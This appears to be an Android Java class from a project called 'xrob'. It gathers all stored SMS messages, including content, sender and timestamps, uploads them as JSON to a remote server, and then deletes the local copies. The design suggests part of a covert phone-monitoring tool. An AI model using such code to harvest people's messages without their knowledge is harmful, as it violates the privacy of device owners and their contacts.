package com.theah64.xrob.asynctasks;

import android.annotation.SuppressLint;
import android.content.Context;

import com.theah64.xrob.database.Messages;
import com.theah64.xrob.database.PendingDeliveries;
import com.theah64.xrob.models.Message;
import com.theah64.xrob.models.PendingDelivery;
import com.theah64.xrob.utils.APIRequestBuilder;
import com.theah64.xrob.utils.APIRequestGateway;
import com.theah64.xrob.utils.APIResponse;
import com.theah64.xrob.utils.OkHttpUtils;
import com.theah64.xrob.utils.Xrob;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.List;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

/**
 * Created by theapache64 on 29/9/16.
 */

public class MessagesSynchronizer extends BaseJSONPostNetworkAsyncTask<Void> {

    public MessagesSynchronizer(Context context, String apiKey) {
        super(context, apiKey);
    }

    @Override
    protected Void doInBackground(String... strings) {

        final Messages messages = Messages.getInstance(getContext());

        //Adding messages to pending delivery queue
        final List<Message> messagesToSync = messages.getAll();

        if (messagesToSync != null) {

            final PendingDeliveries pds = PendingDeliveries.getInstance(getContext());

            try {
                final JSONArray jaMessagesData = convertToJSON(messagesToSync);

                new APIRequestGateway(getContext(), new APIRequestGateway.APIRequestGatewayCallback() {
                    @Override
                    public void onReadyToRequest(String apiKey) {

                        final Request smsSyncRequest = new APIRequestBuilder("/save", apiKey)
                                .addParam(Xrob.KEY_ERROR, "false")
                                .addParam(Xrob.KEY_DATA_TYPE, Xrob.DATA_TYPE_MESSAGES)
                                .addParam(Xrob.KEY_MESSAGE, jaMessagesData.length() + " message(s) added")
                                .addParam(Xrob.KEY_DATA, jaMessagesData.toString())
                                .build();


                        OkHttpUtils.getInstance().getClient().newCall(smsSyncRequest).enqueue(new Callback() {
                            @Override
                            public void onFailure(Call call, IOException e) {
                                onFailed(e.getMessage());
                            }

                            @Override
                            public void onResponse(Call call, Response response) throws IOException {
                                try {
                                    new APIResponse(OkHttpUtils.logAndGetStringBody(response));
                                    messages.deleteAll();
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                    onFailed(e.getMessage());
                                } catch (APIResponse.APIException e) {
                                    e.printStackTrace();
                                }
                            }
                        });
                    }

                    @Override
                    public void onFailed(String reason) {

                        //Converting to json
                        @SuppressLint("DefaultLocale")
                        final PendingDelivery pd = new PendingDelivery(
                                null, false,
                                Xrob.DATA_TYPE_MESSAGES,
                                jaMessagesData.toString(),
                                String.format("%d message(s) retrieved", messagesToSync.size())
                        );

                        final boolean isAdded = pds.add(pd) != -1;
                        if (isAdded) {
                            //Deleting data from
                            messages.deleteAll();
                        } else {
                            pds.add(new PendingDelivery(null, true, Xrob.DATA_TYPE_MESSAGES, null, "Failed to add messages to pending delivery."));
                        }
                    }
                });

            } catch (JSONException e) {
                e.printStackTrace();
            }

        }

        return null;
    }

    private static JSONArray convertToJSON(List<Message> messagesToSync) throws JSONException {
        final JSONArray jaMessages = new JSONArray();

        //Looping through each node.
        for (final Message message : messagesToSync) {
            final JSONObject joMessage = new JSONObject();

            joMessage.put(Messages.COLUMN_ANDROID_MESSAGE_ID, message.getAndroidId());
            joMessage.put(Messages.COLUMN_CONTENT, message.getContent());
            joMessage.put(Messages.COLUMN_TYPE, message.getType());
            joMessage.put(Messages.COLUMN_FROM, message.getFrom());
            joMessage.put(Messages.COLUMN_DELIVERY_TIME, message.getDeliveryTime());

            jaMessages.put(joMessage);
        }

        
        return jaMessages;
    }
}
